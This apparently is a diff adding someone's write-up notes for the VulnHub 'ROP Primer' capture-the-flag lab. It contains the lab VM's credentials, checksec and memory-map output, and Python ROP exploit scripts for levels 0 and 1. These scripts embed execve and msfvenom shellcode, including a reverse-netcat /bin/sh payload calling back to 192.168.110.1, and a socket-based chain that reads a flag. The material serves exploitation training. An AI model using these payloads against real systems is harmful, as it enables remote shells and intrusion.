@@ -1,0 +1,213 @@
+https://www.vulnhub.com/entry/rop-primer-02,114/
+https://g0blin.co.uk/rop-primer-0-2-vulnhub-writeup/
+https://xmgv.wordpress.com/2015/08/17/rop-primer-level-1/
+http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/
+- readelf
+- /usr/include/i386-linux-gnu/bits/fcntl-linux.h
+
+
+Username: root
+Password: toor
+
+Username: level0
+Password: warmup
+
+== Level 0
+
+
+level0@rop:~$ cat /proc/sys/kernel/randomize_va_space
+0
+
+
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+gdb-peda$ vm
+Start      End        Perm      Name
+0x08048000 0x080ca000 r-xp      /home/level0/level0
+0x080ca000 0x080cb000 rw-p      /home/level0/level0
+0x080cb000 0x080ef000 rw-p      [heap]
+0xb7fff000 0xb8000000 r-xp      [vdso]
+0xbffdf000 0xc0000000 rw-p      [stack]
+
+
+level0@rop:~$ cat exploit.py 
+import struct
+
+def p(x):
+        return struct.pack('<L', x)
+mprotect = p(0x80523e0)
+mem = p(0x080ca000)
+
+# https://gist.github.com/resilar/8771d94f8774c77f91cea99bf1a66ec8
+sc = ""
+sc += "\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54"
+sc += "\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b"
+sc += "\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff"
+sc += "/bin/sh";
+# http://phrack.org/issues/49/14.html
+sc =  ""
+sc += "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+sc += "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+sc += "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+sc += "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3"
+
+# msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 --platform linux  -f python -b "\x00\x0a\0d"
+sc =  ""
+sc += "\xba\xb2\x94\x31\x62\xd9\xf7\xd9\x74\x24\xf4\x58\x2b"
+sc += "\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xc0\x04\xe2"
+sc += "\x47\xfe\x3a\x3a\x3e\xad\x5a\xd2\x6d\x31\x2a\xc5\x05"
+sc += "\x9a\x5f\x62\xd5\x8c\xb0\x10\xbc\x22\x46\x37\x6c\x53"
+sc += "\x50\xb8\x90\xa3\x4e\xda\xf9\xcd\xbf\x69\x91\x11\x97"
+sc += "\xde\xe8\xf3\xda\x61"
+
+# msfvenom -p cmd/unix/reverse_netcat lhost=192.168.110.1 lport=1234 R
+#msfvenom -p linux/x86/exec CMD="mkfifo /tmp/lerfv; nc 192.168.110.1 1234 0</tmp/lerfv | /bin/sh >/tmp/lerfv 2>&1; rm /tmp/lerfv" -a x86 --platform linux  -f python -b "\x00\x0a\0d"
+sc =  ""
+sc += "\xd9\xe9\xd9\x74\x24\xf4\xba\x87\xc9\x90\x25\x5e\x29"
+sc += "\xc9\xb1\x21\x31\x56\x1a\x83\xc6\x04\x03\x56\x16\xe2"
+sc += "\x72\xa3\x9b\x7d\xe5\x66\xfa\x15\x38\xe4\x8b\x01\x2a"
+sc += "\xc5\xf8\xa5\xaa\x71\xd0\x57\xc3\xef\xa7\x7b\x41\x18"
+sc += "\xd7\x7b\x65\xd8\x75\x17\x03\xb1\xe3\x88\xeb\x6e\x98"
+sc += "\x3b\x9b\x5f\x0c\xa1\x29\xc6\xba\x12\xed\x68\x20\x45"
+sc += "\xdc\x4d\x94\xab\x2f\x98\xe0\x9d\x7e\xd5\x20\xcc\xb1"
+sc += "\x35\x70\x22\x82\x01\x52\x72\xd8\x46\xe6\x1f\x50\xb6"
+sc += "\x6a\x85\xe2\xae\x04\x65\x7e\x0f\xc6\x07\x17\x21\x37"
+sc += "\xbb\x8f\x9d\x79\x14\x3b\xb3\xf5\x45\xaf\x2e\x84\xff"
+sc += "\x59\x91\x5a\x3e\x83\xe0\xa1\x1e\xb9\x6f\xf6\x71\x49"
+sc += "\x1d\x86\xa2\xdd\xb8\x14\xdb\x6b\x43\x8e\x70\x1a\xa2"
+sc += "\xfd\xf7"
+popret = p(0x8048550)
+pop2ret = p(0x8048883)
+pop3ret = p(0x8048882)
+pop4ret = p(0x8048881)
+
+
+buf = ""
+buf += "A" * 44
+buf += mprotect
+#buf += "B" * 4
+buf += pop3ret
+buf += mem
+buf += p(0x1000)
+buf += p(0x7)
+
+#void *memcpy(void *dest, const void *src, size_t n);
+memcpy = p(0x8051500)
+
+buf += memcpy
+#buf += "B" * 4
+#buf += mem  # return
+buf += p(0x8048197)  # call eax
+buf += mem # dest
+#src = 0xbffff714 + 0x30
+#src = 0xbffff714
+src = 0xbffff754
+
+# dump 0xbffff758  0xbffff754
+#src = 0xbffff724
+buf += p(src) # src
+buf += p(len(sc)) 
+#buf += "C" * len(sc)
+buf += sc
+
+
+print buf
+
+
+== Level 1
+
+level1@rop:~$ cat exploit.py 
+import socket
+import struct
+
+def p(x):
+        return struct.pack("<L", x)
+
+
+
+adr_open = p(0x80486d0)
+adr_read = p(0x8048640)
+adr_write = p(0x8048700)
+adr_mem = p(0x0804a000)
+flag = p(0x8049128)
+
+pop2ret = p(0x8048ef7)
+pop3ret = p(0x8048ef6)
+
+
+buf = ""
+buf += "A"*64
+#int open(const char *pathname, int flags);
+buf +=  p(0x80486d0) # open
+buf +=  pop2ret # ret
+buf +=  p(0x8049128) # filename : "flag"
+buf +=  p(0x0) # O_RDONLY
+
+#ssize_t read(int fd, void *buf, size_t count);
+buf += p(0xb7f004f0) # read
+buf += pop3ret
+buf +=  p(0x3) # fd
+buf +=  p(0x0804a000) # zone writable vmmap
+buf += p(0x80)
+
+#ssize_t write(int fd, const void *buf, size_t count);
+buf += p(0xb7f00570) # write
+#buf += p(0xdeadbeef)
+buf += p(0xb7e581e0)
+buf +=  p(0x4) # socket
+buf +=  p(0x0804a000) # zone writable vmmap
+buf += p(0x80)
+
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(('192.168.110.35', 8888))
+print client.recv(1024)
+client.send("store\n")
+print client.recv(512)
+print (len(buf) + 1)
+client.send(str(len(buf) + 1) + "\n")
+print client.recv(512)
+client.send(buf+ "\n")
+print client.recv(512)
+
+client.send(buf+ "\n")
+print client.recv(1024)
+
+exit
+# shellcode from msfvenom
+sc =  ""
+sc += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
+sc += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
+sc += "\xa8\x6e\x01\x68\x02\x00\x11\x5d\x89\xe1\xb0\x66\x50"
+sc += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
+sc += "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
+sc += "\x0b\xcd\x80"
+
+# padding
+buf = "A" * 168
+
+# call eax gadget
+# buf += "\x63\x85\x04\x08\n"
+buf += struct.pack('I', 0xfff4f240)
+buf += sc
+
+
+# buf = "A" * 168  + "B" * 4 + "C"*200
+
+client.send(buf)
+
+
+
+
+
+gdb-peda$ set follow-fork-mode child 
+gdb-peda$ set {int}0xbffff6b0 = 8889
+gdb-peda$ pattern_create 127
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO'
+
+
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO
